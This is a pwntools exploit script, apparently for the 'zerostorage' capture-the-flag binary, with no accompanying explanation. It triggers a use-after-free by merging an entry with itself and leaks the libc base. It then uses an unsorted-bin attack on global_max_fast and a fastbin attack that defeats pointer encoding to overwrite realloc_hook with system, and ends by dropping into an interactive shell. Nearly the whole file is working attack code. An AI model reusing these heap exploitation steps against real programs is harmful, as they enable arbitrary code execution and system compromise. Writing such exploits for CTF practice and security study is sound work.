# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
r = process('./zerostorage')

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

binn = ELF("./zerostorage")

def update(eid, data):
    r.recvuntil('Your choice: ')
    r.sendline('2')
    r.sendline(str(eid))
    r.sendline(str(len(data)))
    r.send(data) 

def insert(data):
    r.recvuntil('Your choice: ')
    r.sendline('1')
    r.sendline(str(len(data)) )
    r.send(data) 

def merge(id1, id2):
    r.recvuntil('Your choice: ')
    r.sendline('3')
    r.sendline(str(id1)) 
    r.sendline(str(id2))

def view(id1):
    r.recvuntil('Your choice: ')
    r.sendline('5')
    r.sendline(str(id1)) 

def delete(id1):
    r.recvuntil('Your choice: ')
    r.sendline('4')
    r.sendline(str(id1)) 

print(str(r.proc.pid))

# insert('A'*4) #0
insert('/bin/sh\0') #0
insert('B'*4) # 1
insert('C'*4) # 2
insert('A1'*4)
insert('B1'*4)
insert('C1'*4) # 5
insert('A2'*4)
insert('B2'*4)
# insert('C2'*4) # 8
insert('X'*0x90)

# r.recv(timeout=0.1)

merge(1, 1)# merge 1 to 1 to trig UAF, get new id 9



# 1. leak libc base
view(9)
r.recvuntil('Entry No.9:\n') # 
raw = r.recv(6).ljust(8, '\x00')
leak =  u64(raw)
libc_base = leak -  0x3c4b78
system_addr = libc_base +  0x45390 # 0x7ffff7a52390
print('----libc base: ', hex(libc_base))

global_max_fast =libc_base + 0x3c67f8 # 0x7ffff7dd37f8
payload = ''
payload += raw + p64(global_max_fast-16)
update(9, payload)

# 2. write 0x00007ffff7dd1b78 to global_max_fast. 
insert('A'*4) # trig unsorted_bin_attack #id 1

# 3. fast attack
merge(4, 4) # new id 10,  UAF at id 4
# target = 0x5555557570d8 # ptr near id5
target = 0x555555757120 # ptr near id8
update(10, p64(target)) # write target fd

insert('A'*8)
# r.recvuntil('Your choice: ')
# r.sendline('1')
# r.sendline(str(128))
# r.send('A\x00') 
# insert('B')

## point:...
insert('C'*128) # 122?

view(11)
r.recvuntil('Entry No.11:\n')
r.recv(80-8) 
raw = r.recv(8)
enc =  u64(raw)
print("enc: ", hex(enc))

key = enc ^ (target+0x10)
print("key: ", hex(key))

# strtol_got = binn.got['strtol']
# strtol_enc = strtol_got ^ key
realloc_hook = libc_base + 0x3c4b08
realloc_hook_enc = realloc_hook ^ key
print('realloc_hook: ', hex(realloc_hook))
print('realloc_hook_enc: ', hex(realloc_hook_enc))
payload = ''
# payload += p64(0x43)*7 + p32(1) + p32(0x43) + p64(0x80) + p64(realloc_hook_enc)+'A'*8
payload += p64(0x43) + p64(1) + p64(0x43) + p64(realloc_hook_enc) 
update(11, payload)


update(9, p64(system_addr))

# update(0, 400*'A')
r.recvuntil('Your choice: ')
r.sendline('2')
r.sendline(str(0))
r.sendline(str(400))
# r.send(data) 

# poc
r.sendline('pwd')

r.recv(timeout=0.1)
gdb.attach(r, """
heapinfo
x/10gx 0x00203060+0x555555554000
x/10gx  0x555555758000+0x0
x/10gx  0x555555758000+0x90
x/10gx 0x7ffff7dd37f8
echo entry[8]:
x/10gx 0x00203060 + 0x555555554000+24*8
echo entry[11]:
x/10gx 0x00203060 + 0x555555554000+24*11
echo xor:
x/x 0x00203048+0x555555554000
echo total:
x/20gx 0x555555757120
""");

print(str(r.proc.pid))

r.interactive()

